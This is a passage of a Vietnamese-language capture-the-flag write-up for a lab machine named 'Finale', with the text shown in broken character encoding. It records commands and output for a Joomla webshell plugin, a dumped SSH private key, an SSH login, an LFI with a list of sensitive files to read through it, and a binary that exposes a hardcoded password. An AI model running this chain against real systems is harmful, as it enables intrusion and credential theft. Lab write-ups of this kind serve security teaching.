phiÃªn báº£n má»›i, tÃ´i Ä‘Ã£ thá»­ tÃ¬m kiáº¿m cÃ¡c lá»— há»•ng cÅ©ng nhÆ° PoC cá»§a phiÃªn báº£n nÃ y nhÆ°ng khÃ´ng cÃ³ káº¿t quáº£ kháº£ thi. Váº­y nÃªn tÃ´i sáº½ chuyá»ƒn sang cÃ¡ch khai thÃ¡c lÃ  tÃ¬m kiáº¿m plugin hoáº·c template cÃ³ chá»©a lá»— há»•ng cÃ³ thá»ƒ khai thÃ¡c Ä‘Æ°á»£c. DÃ¹ sao thÃ¬ tÃ´i cÅ©ng Ä‘Ã£ cÃ³ user admin vá»›i quyá»n cao nháº¥t, nÃªn tÃ´i cÃ³ thá»ƒ lÃ m má»i thá»© vá»›i web nÃ y.\nSau khi tÃ¬m kiáº¿m trÃªn internet, tÃ´i tÃ¬m tháº¥y plugin cÃ³ thá»ƒ táº¡o Ä‘Æ°á»£c lá»— há»•ng command injection vÃ  thá»±c thi Ä‘Æ°á»£c rce trÃªn mÃ¡y\nTruy cáº­p vÃ o github repo vÃ  táº£i plugin vá». Sau Ä‘Ã³ upload nÃ³ lÃªn joomla\nSystem -\u0026gt; Extension, táº¡i Upload Package File, táº£i lÃªn plugin. Khi thÃ nh cÃ´ng, tÃ´i nháº­n Ä‘Æ°á»£c thÃ´ng bÃ¡o\nTiáº¿p tá»¥c lÃ m theo hÆ°á»›ng dáº«n nhÆ° trong github repo, thá»­ cÃ¢u lá»‡nh id\nGaining access # Váº­y lÃ  tÃ´i Ä‘Ã£ thá»±c thi Ä‘Æ°á»£c lá»— há»•ng command injection trÃªn joomla. Tiáº¿p tá»¥c lÃ m theo hÆ°á»›ng dáº«n trong repo Ä‘á»ƒ láº¥y rce. Clone repo vá» mÃ¡y kali\nâ”Œâ”€â”€(neoã‰¿n0b0dy)-[~/Finale] â””â”€$ git clone https://github.com/p0dalirius/Joomla-webshell-plugin.git Cloning into \u0026#39;Joomla-webshell-plugin\u0026#39;... remote: Enumerating objects: 33, done. remote: Counting objects: 100% (33/33), done. remote: Compressing objects: 100% (31/31), done. remote: Total 33 (delta 4), reused 25 (delta 0), pack-reused 0 Receiving objects: 100% (33/33), 3.21 MiB | 2.26 MiB/s, done. Resolving deltas: 100% (4/4), done. â”Œâ”€â”€(neoã‰¿n0b0dy)-[~/Finale] â””â”€$ cd Joomla-webshell-plugin â”Œâ”€â”€(neoã‰¿n0b0dy)-[~/Finale/Joomla-webshell-plugin] â””â”€$ ls -la total 44 drwxr-xr-x 7 neo neo 4096 Jun 24 01:07 . drwxr-xr-x 4 neo neo 4096 Jun 24 01:07 .. -rwxr-xr-x 1 neo neo 4756 Jun 24 01:07 console.py drwxr-xr-x 2 neo neo 4096 Jun 24 01:07 dist drwxr-xr-x 8 neo neo 4096 Jun 24 01:07 .git drwxr-xr-x 2 neo neo 4096 Jun 24 01:07 .github -rw-r--r-- 1 neo neo 352 Jun 24 01:07 Makefile drwxr-xr-x 4 neo neo 4096 Jun 24 01:07 plugin -rw-r--r-- 1 neo neo 3624 Jun 24 01:07 README.md drwxr-xr-x 2 neo neo 4096 Jun 24 01:07 test_env Sá»­ dá»¥ng python Ä‘á»ƒ láº¥y rce\nâ”Œâ”€â”€(neoã‰¿n0b0dy)-[~/Finale/Joomla-webshell-plugin] â””â”€$ python3 console.py -t http://192.168.24.165 [webshell]\u0026gt; id uid=33(www-data) gid=33(www-data) groups=33(www-data) [webshell]\u0026gt; whoami www-data [webshell]\u0026gt; pwd / TÃ´i tÃ¬m tháº¥y thá»© ssh private key cá»§a user bill, vÃ  do lá»—i phÃ¢n quyá»n cá»§a ngÆ°á»i quáº£n trá»‹ nÃªn tÃ´i váº«n cÃ³ thá»ƒ xem Ä‘Æ°á»£c private key vÃ  láº¥y nÃ³ vá»\n[webshell]\u0026gt; ls -la /home total 20 drwxr-xr-x 5 root root 4096 Jun 21 18:20 . drwxr-xr-x 19 root root 4096 Jun 18 09:52 .. drwxr-xr-x 5 bill bill 4096 Jun 24 02:44 bill drwxr-xr-x 4 ftpuser ftpuser 4096 Jun 22 13:53 ftpuser drwxr-xr-x 5 mark mark 4096 Jun 21 19:34 mark [webshell]\u0026gt; ls -la /home/bill total 36 drwxr-xr-x 5 bill bill 4096 Jun 24 02:44 . drwxr-xr-x 5 root root 4096 Jun 21 18:20 .. -rw-r--r-- 1 root root 0 Jun 21 19:34 .bash_history -rw-r--r-- 1 bill bill 220 Jun 19 18:01 .bash_logout -rw-r--r-- 1 bill bill 3771 Jun 19 18:01 .bashrc drwx------ 2 bill bill 4096 Jun 21 15:14 .cache -rw------- 1 bill bill 0 Jun 21 19:29 .history drwxrwxr-x 3 bill bill 4096 Jun 21 15:14 .local -rw-r--r-- 1 bill bill 807 Jun 19 18:01 .profile drwxr-xr-x 2 bill bill 4096 Jun 21 16:15 .ssh -rw-r--r-- 1 root root 0 Jun 21 19:34 .zsh_history -rw------- 1 bill bill 33 Jun 21 15:35 user.txt [webshell]\u0026gt; cat /home/bill/.ssh/id_rsa -----BEGIN OPENSSH PRIVATE KEY----- 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 -----END OPENSSH PRIVATE KEY----- Láº¥y key vá», thay Ä‘á»•i quyá»n vÃ  login ssh\nâ”Œâ”€â”€(neoã‰¿n0b0dy)-[~/Finale] â””â”€$ nano id_rsa â”Œâ”€â”€(neoã‰¿n0b0dy)-[~/Finale] â””â”€$ chmod 600 id_rsa â”Œâ”€â”€(neoã‰¿n0b0dy)-[~/Finale] â””â”€$ ssh -i id_rsa bill@192.168.24.165 Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-186-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/pro System information as of Mon 24 Jun 2024 03:21:32 AM UTC System load: 0.02 Processes: 237 Usage of /: 16.4% of 47.93GB Users logged in: 0 Memory usage: 18% IPv4 address for ens32: 192.168.24.165 Swap usage: 0% * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s just raised the bar for easy, resilient and secure K8s cluster deployment. https://ubuntu.com/engage/secure-kubernetes-at-the-edge Expanded Security Maintenance for Applications is not enabled. 0 updates can be applied immediately. Enable ESM Apps to receive additional future security updates. See https://ubuntu.com/esm or run: sudo pro status New release \u0026#39;22.04.3 LTS\u0026#39; available. Run \u0026#39;do-release-upgrade\u0026#39; to upgrade to it. Last login: Sat Jun 22 13:53:47 2024 from 192.168.24.128 bill@finale:~$ id uid=1001(bill) gid=1001(bill) groups=1001(bill) bill@finale:~$ ls -la total 36 drwxr-xr-x 5 bill bill 4096 Jun 24 02:44 . drwxr-xr-x 5 root root 4096 Jun 21 18:20 .. -rw-r--r-- 1 root root 0 Jun 21 19:34 .bash_history -rw-r--r-- 1 bill bill 220 Jun 19 18:01 .bash_logout -rw-r--r-- 1 bill bill 3771 Jun 19 18:01 .bashrc drwx------ 2 bill bill 4096 Jun 21 15:14 .cache -rw------- 1 bill bill 0 Jun 21 19:29 .history drwxrwxr-x 3 bill bill 4096 Jun 21 15:14 .local -rw-r--r-- 1 bill bill 807 Jun 19 18:01 .profile drwxr-xr-x 2 bill bill 4096 Jun 21 16:15 .ssh -rw------- 1 bill bill 33 Jun 21 15:35 user.txt -rw-r--r-- 1 root root 0 Jun 21 19:34 .zsh_history bill@finale:~$ cat user.txt 1c49f6a547901cc4b95d15baf8f0c9be bill@finale:~$ Port 1337 - HTTP # Truy cáº­p vÃ o web http://192.168.24.165:1337\nâ”Œâ”€â”€(neoã‰¿n0b0dy)-[~/Finale] â””â”€$ whatweb http://192.168.24.165:1337 http://192.168.24.165:1337 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.24.165], Title[Cat Blog - Home] Sá»­ dá»¥ng dirsearch\nâ”Œâ”€â”€(neoã‰¿n0b0dy)-[~/Finale] â””â”€$ dirsearch -u http://192.168.24.165:1337 _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460 Output File: /home/neo/Finale/reports/http_192.168.24.165_1337/_24-06-24_11-00-30.txt Target: http://192.168.24.165:1337/ [11:00:30] Starting: [11:00:31] 403 - 281B - /.ht_wsr.txt [11:00:31] 403 - 281B - /.htaccess.bak1 [11:00:31] 403 - 281B - /.htaccess.orig [11:00:31] 403 - 281B - /.htaccess.sample [11:00:31] 403 - 281B - /.htaccess.save [11:00:31] 403 - 281B - /.htaccess_extra [11:00:31] 403 - 281B - /.htaccess_orig [11:00:31] 403 - 281B - /.htaccessBAK [11:00:31] 403 - 281B - /.htaccess_sc [11:00:31] 403 - 281B - /.htaccessOLD [11:00:31] 403 - 281B - /.htaccessOLD2 [11:00:31] 403 - 281B - /.htm [11:00:31] 403 - 281B - /.html [11:00:31] 403 - 281B - /.htpasswds [11:00:31] 403 - 281B - /.httr-oauth [11:00:32] 403 - 281B - /.php [11:00:34] 403 - 281B - /.htpasswd_test [11:00:35] 200 - 507B - /about.php [11:00:47] 200 - 597B - /contact.php [11:00:47] 301 - 321B - /css -\u0026gt; http://192.168.24.165:1337/css/ [11:00:53] 200 - 448B - /gallery.php [11:00:55] 301 - 324B - /images -\u0026gt; http://192.168.24.165:1337/images/ [11:00:55] 200 - 501B - /images/ [11:01:05] 301 - 323B - /posts -\u0026gt; http://192.168.24.165:1337/posts/ [11:01:07] 403 - 281B - /server-status [11:01:07] 403 - 281B - /server-status/ Task Completed á» /posts/, tÃ´i Ä‘á»ƒ Ã½ pháº§n url cÃ³ thá»ƒ khai thÃ¡c lá»— há»•ng LFI. Sau khi thá»­ má»™t sá»‘ payload LFI Ä‘Æ¡n giáº£n, tÃ´i tÃ¬m Ä‘Æ°á»£c payload LFI vá»›i base64 encode\nSá»­ dá»¥ng Burpsuite Ä‘á»ƒ chá»‰nh sá»­a request\nLá»— há»•ng Local File Inclusion (LFI) lÃ  má»™t trong nhá»¯ng lá»— há»•ng báº£o máº­t phá»• biáº¿n trong cÃ¡c á»©ng dá»¥ng web. Má»¥c Ä‘Ã­ch cá»§a lá»— há»•ng LFI lÃ  cho phÃ©p káº» táº¥n cÃ´ng Ä‘á»c vÃ  Ä‘Ã´i khi thá»±c thi cÃ¡c tá»‡p tin trÃªn há»‡ thá»‘ng mÃ¡y chá»§ thÃ´ng qua má»™t lá»— há»•ng trong mÃ£ nguá»“n cá»§a á»©ng dá»¥ng web. LFI cÃ³ thá»ƒ Ä‘á»c Ä‘Æ°á»£c táº¥t cáº£ nhá»¯ng file tá»“n táº¡i trong mÃ¡y chá»§ miá»…n lÃ  user cá»§a chÃºng ta cÃ³ quyá»n Ä‘á»c nÃ³.\nTá»‡p cáº¥u hÃ¬nh há»‡ thá»‘ng /etc/passwd: Chá»©a thÃ´ng tin vá» ngÆ°á»i dÃ¹ng trÃªn há»‡ thá»‘ng Unix/Linux. /etc/shadow: Chá»©a máº­t kháº©u Ä‘Ã£ Ä‘Æ°á»£c bÄƒm cá»§a ngÆ°á»i dÃ¹ng trÃªn há»‡ thá»‘ng Unix/Linux. /etc/group: Chá»©a thÃ´ng tin vá» cÃ¡c nhÃ³m ngÆ°á»i dÃ¹ng trÃªn há»‡ thá»‘ng Unix/Linux. /etc/hosts: Chá»©a thÃ´ng tin vá» Ã¡nh xáº¡ Ä‘á»‹a chá»‰ IP vÃ  tÃªn miá»n cá»¥c bá»™. Tá»‡p cáº¥u hÃ¬nh á»©ng dá»¥ng config.php hoáº·c config.yml: Chá»©a thÃ´ng tin cáº¥u hÃ¬nh cho cÃ¡c á»©ng dá»¥ng web, bao gá»“m thÃ´ng tin Ä‘Äƒng nháº­p cÆ¡ sá»Ÿ dá»¯ liá»‡u. settings.py: Tá»‡p cáº¥u hÃ¬nh cá»§a á»©ng dá»¥ng Django. web.config: Tá»‡p cáº¥u hÃ¬nh cá»§a á»©ng dá»¥ng ASP.NET. .env: Tá»‡p mÃ´i trÆ°á»ng chá»©a cÃ¡c biáº¿n mÃ´i trÆ°á»ng, bao gá»“m thÃ´ng tin nháº¡y cáº£m nhÆ° API keys, thÃ´ng tin Ä‘Äƒng nháº­p. Tá»‡p nháº­t kÃ½ (log files) /var/log/syslog hoáº·c /var/log/messages: Tá»‡p nháº­t kÃ½ há»‡ thá»‘ng. /var/log/auth.log: Tá»‡p nháº­t kÃ½ xÃ¡c thá»±c, ghi láº¡i cÃ¡c sá»± kiá»‡n Ä‘Äƒng nháº­p vÃ  cÃ¡c hoáº¡t Ä‘á»™ng liÃªn quan Ä‘áº¿n báº£o máº­t. /var/log/apache2/access.log: Tá»‡p nháº­t kÃ½ truy cáº­p cá»§a mÃ¡y chá»§ web Apache. /var/log/nginx/access.log: Tá»‡p nháº­t kÃ½ truy cáº­p cá»§a mÃ¡y chá»§ web Nginx. Tá»‡p cÆ¡ sá»Ÿ dá»¯ liá»‡u database.sqlite: Tá»‡p cÆ¡ sá»Ÿ dá»¯ liá»‡u SQLite cÃ³ thá»ƒ chá»©a dá»¯ liá»‡u quan trá»ng. backup.sql: Tá»‡p sao lÆ°u cÆ¡ sá»Ÿ dá»¯ liá»‡u cÃ³ thá»ƒ chá»©a toÃ n bá»™ dá»¯ liá»‡u á»©ng dá»¥ng. Tá»‡p mÃ£ nguá»“n vÃ  tÃ i liá»‡u source code files: MÃ£ nguá»“n cá»§a á»©ng dá»¥ng cÃ³ thá»ƒ chá»©a cÃ¡c thÃ´ng tin nháº¡y cáº£m nhÆ° API keys, thÃ´ng tin Ä‘Äƒng nháº­p hoáº·c cÃ¡c Ä‘oáº¡n mÃ£ dá»… bá»‹ táº¥n cÃ´ng. documentation: CÃ¡c tÃ i liá»‡u ná»™i bá»™ cÃ³ thá»ƒ chá»©a thÃ´ng tin vá» kiáº¿n trÃºc há»‡ thá»‘ng, hÆ°á»›ng dáº«n quáº£n trá»‹ vÃ  cÃ¡c thÃ´ng tin nháº¡y cáº£m khÃ¡c. KhÃ³a báº£o máº­t vÃ  chá»©ng chá»‰ id_rsa: KhÃ³a riÃªng tÆ° cho SSH, thÆ°á»ng Ä‘Æ°á»£c lÆ°u trong thÆ° má»¥c ~/.ssh. id_rsa.pub: KhÃ³a cÃ´ng khai cho SSH. server.key: KhÃ³a riÃªng tÆ° cá»§a mÃ¡y chá»§ sá»­ dá»¥ng cho SSL/TLS. server.crt: Chá»©ng chá»‰ SSL/TLS cá»§a mÃ¡y chá»§. Tá»‡p chá»©a thÃ´ng tin nháº­n dáº¡ng cÃ¡ nhÃ¢n (PII) user_data.json: Tá»‡p chá»©a thÃ´ng tin ngÆ°á»i dÃ¹ng, bao gá»“m tÃªn, Ä‘á»‹a chá»‰ email, sá»‘ Ä‘iá»‡n thoáº¡i, Ä‘á»‹a chá»‰, vÃ  cÃ¡c thÃ´ng tin cÃ¡ nhÃ¢n khÃ¡c. customer_info.csv: Tá»‡p chá»©a thÃ´ng tin khÃ¡ch hÃ ng. Tá»‡p táº¡m thá»i vÃ  tá»‡p lÆ°u trá»¯ /tmp/sensitive_data.tmp: Tá»‡p táº¡m thá»i chá»©a dá»¯ liá»‡u nháº¡y cáº£m. /var/tmp/backups.zip: Tá»‡p lÆ°u trá»¯ chá»©a cÃ¡c tá»‡p sao lÆ°u quan trá»ng. Tá»‡p kiá»ƒm soÃ¡t truy cáº­p .htaccess: Tá»‡p cáº¥u hÃ¬nh cá»§a Apache, cÃ³ thá»ƒ chá»©a cÃ¡c quy táº¯c báº£o máº­t vÃ  kiá»ƒm soÃ¡t truy cáº­p. .htpasswd: Tá»‡p chá»©a tÃªn ngÆ°á»i dÃ¹ng vÃ  máº­t kháº©u Ä‘Ã£ bÄƒm Ä‘á»ƒ kiá»ƒm soÃ¡t truy cáº­p vÃ o cÃ¡c vÃ¹ng báº£o máº­t cá»§a trang web. CÃ¡c tá»‡p khÃ¡c cÃ³ thá»ƒ chá»©a thÃ´ng tin nháº¡y cáº£m /proc/kcore: HÃ¬nh áº£nh cá»§a bá»™ nhá»› váº­t lÃ½, cÃ³ thá»ƒ chá»©a cÃ¡c thÃ´ng tin nháº¡y cáº£m náº¿u bá»‹ truy cáº­p. /proc/self/environ: Tá»‡p mÃ´i trÆ°á»ng cá»§a quy trÃ¬nh hiá»‡n táº¡i, cÃ³ thá»ƒ chá»©a cÃ¡c biáº¿n mÃ´i trÆ°á»ng nháº¡y cáº£m. Tá»« ná»™i dung file /etc/passwd phÃ­a trÃªn, tÃ´i biáº¿t Ä‘Æ°á»£c mÃ¡y cÃ³ 2 user lÃ  bill vÃ  mark. TÃ¬m kiáº¿m ssh private key cá»§a 2 user nÃ y, tÃ´i Ä‘á»c Ä‘Æ°á»£c private key cá»§a bill\nLÆ°u nÃ³ vá» vÃ  login ssh. Äoáº¡n nÃ y thÃ¬ giá»‘ng vá»›i Port 80 rá»“i nÃªn tÃ´i sáº½ khÃ´ng nháº¯c láº¡i ná»¯a.\nPrivilege escalation # TÃ´i nháº­n tháº¥y bill khÃ´ng cÃ³ quyá»n sudo, nhÆ°ng mark thÃ¬ cÃ³\nbill@finale:~$ id uid=1001(bill) gid=1001(bill) groups=1001(bill) bill@finale:~$ id mark uid=1000(mark) gid=1000(mark) groups=1000(mark),27(sudo) Váº­y nÃªn trÆ°á»›c tiÃªn tÃ´i sáº½ tÃ¬m cÃ¡ch leo sang mark. BÃªn trong thÆ° má»¥c cá»§a mark cÃ³ vÃ i thá»© hay ho\nbill@finale:~$ cd /home/mark/ bill@finale:/home/mark$ ls -la total 52 drwxr-xr-x 5 mark mark 4096 Jun 21 19:34 . drwxr-xr-x 5 root root 4096 Jun 21 18:20 .. -rw-r--r-- 1 mark mark 15952 Jun 21 18:16 actvn -rw-r--r-- 1 root root 0 Jun 21 19:34 .bash_history -rw-r--r-- 1 mark mark 220 Feb 25 2020 .bash_logout -rw-r--r-- 1 mark mark 3771 Feb 25 2020 .bashrc drwx------ 2 mark mark 4096 Jun 18 09:59 .cache -rw------- 1 mark mark 0 Jun 21 19:29 .history drwxrwxr-x 3 mark mark 4096 Jun 18 10:11 .local -rw-r--r-- 1 mark mark 807 Feb 25 2020 .profile drwx------ 2 mark mark 4096 Jun 18 09:57 .ssh -rw-r--r-- 1 mark mark 0 Jun 18 09:59 .sudo_as_admin_successful -rw-rw-rw- 1 mark bill 216 Jun 22 16:07 zip_move.py -rw-r--r-- 1 root root 0 Jun 21 19:34 .zsh_history bill@finale:/home/mark$ XÃ¡c Ä‘á»‹nh Ä‘á»‹nh dáº¡ng cá»§a file actvn\nbill@finale:/home/mark$ file actvn actvn: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=758079e8804c56fef093eb3e779b30110bf712ac, for GNU/Linux 3.2.0, not stripped Thá»­ phÃ¢n tÃ­ch file nÃ y\nbill@finale:/home/mark$ strings actvn Command \u0026#39;strings\u0026#39; not found, but can be installed with: apt install binutils Please ask your administrator. bill@finale:/home/mark$ cat actvn @@@@ï¿½mm ï¿½-ï¿½=ï¿½=HPï¿½-ï¿½=ï¿½=ï¿½888 XXXDDSï¿½td888 Pï¿½td, , , ,,Qï¿½tdRï¿½tdï¿½-ï¿½=ï¿½=00/lib64/ld-linux-x86-64.so.2GNUï¿½ï¿½GNUuï¿½yï¿½LVï¿½ï¿½ï¿½\u0026gt;wï¿½0 ï¿½ï¿½GNUï¿½ï¿½eï¿½mH \u0026#34;d s \u0026#34;__cxa_finalize__libc_start_mainputslibc.so.6GLIBC_2.2.5GLIBC_2.34_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMCloneTable\u0026#39;uâ¦i 1ï¿½ï¿½ï¿½=ï¿½0ï¿½ï¿½@ï¿½?ï¿½?ï¿½?ï¿½?ï¿½?@Hï¿½Hï¿½ï¿½/Hï¿½ï¿½tï¿½ï¿½Hï¿½ï¿½ï¿½5ï¿½/ï¿½%ï¿½/@ï¿½%ï¿½/hï¿½ï¿½ï¿½ï¿½ï¿½ï¿½%ï¿½/fï¿½1ï¿½Iï¿½ï¿½^Hï¿½ï¿½Hï¿½ï¿½ï¿½PTE1ï¿½1ï¿½Hï¿½=ï¿½ï¿½O/ï¿½f.ï¿½@Hï¿½=ï¿½/Hï¿½ï¿½/H9ï¿½tHï¿½./Hï¿½ï¿½t ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½=a/Hï¿½5Z/H)ï¿½Hï¿½ï¿½Hï¿½ï¿½?Hï¿½ï¿½Hï¿½Hï¿½ï¿½tHï¿½ï¿½.Hï¿½ï¿½ï¿½ï¿½fDï¿½ï¿½ï¿½ï¿½ï¿½=/u+UHï¿½=ï¿½.Hï¿½ï¿½t Hï¿½=ï¿½.ï¿½)ï¿½ï¿½ï¿½ï¿½dï¿½ï¿½ï¿½ï¿½ï¿½.]ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½wï¿½ï¿½ï¿½UHï¿½ï¿½Hï¿½ï¿½ï¿½ï¿½ï¿½zRxï¿½Hï¿½ï¿½Hï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½Hï¿½ï¿½mark:zuckerberg1984do you love cats?(ï¿½ï¿½ï¿½ï¿½tï¿½ï¿½ï¿½ï¿½$ï¿½ï¿½ï¿½D ï¿½ï¿½ï¿½ï¿½\u0026#34;zRx $xï¿½ï¿½ï¿½ FJ d ï¿½?â¦;*3$\u0026#34;Dpï¿½ï¿½\\Qï¿½ï¿½ï¿½)Aï¿½C 0ï¿½\u0026#39; dï¿½â¦ï¿½ï¿½ï¿½ï¿½oï¿½pï¿½ ï¿½ ï¿½?ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½oï¿½ï¿½ï¿½oï¿½ï¿½ï¿½oï¿½ï¿½ï¿½ï¿½oï¿½=6@GCC: (Debian 13.2.0-24) 13.2.0ï¿½ï¿½ | ï¿½ï¿½ï¿½ ï¿½3ï¿½Iâ¦@Uï¿½=|0ï¿½ï¿½=ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½!ï¿½ï¿½ï¿½ï¿½=ï¿½, ï¿½ï¿½?ï¿½ H@(9@@d@S b@o ~â¦ @LP\u0026#34;ï¿½â¦@ï¿½9)ï¿½@ï¿½ ï¿½\u0026#34;ï¿½ Scrt1.o__abi_tagcrtstuff.cderegister_tm_clones__do_global_dtors_auxcompleted.0__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entryactvn.c__FRAME_END___DYNAMIC__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_start_main@GLIBC_2.34_ITM_deregisterTMCloneTableputs@GLIBC_2.2.5_edata_fini__data_start__gmon_start____dso_handle_IO_stdin_used_end__bss_startmain__TMC_END___ITM_registerTMCloneTable__cxa_finalize@GLIBC_2.2.5_init.symtab.strtab.shstrtab.interp.note.gnu.property.note.gnu.build-id.note.ABI-tag.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.dynamic.got.plt.data.bss.comment#886XX$I|| Wï¿½ï¿½ï¿½oï¿½ï¿½a ï¿½ï¿½ippï¿½qï¿½ï¿½ï¿½oï¿½ï¿½~ï¿½ï¿½ï¿½oï¿½@@ï¿½ï¿½ï¿½ ï¿½PPï¿½dd ï¿½ *ï¿½, , 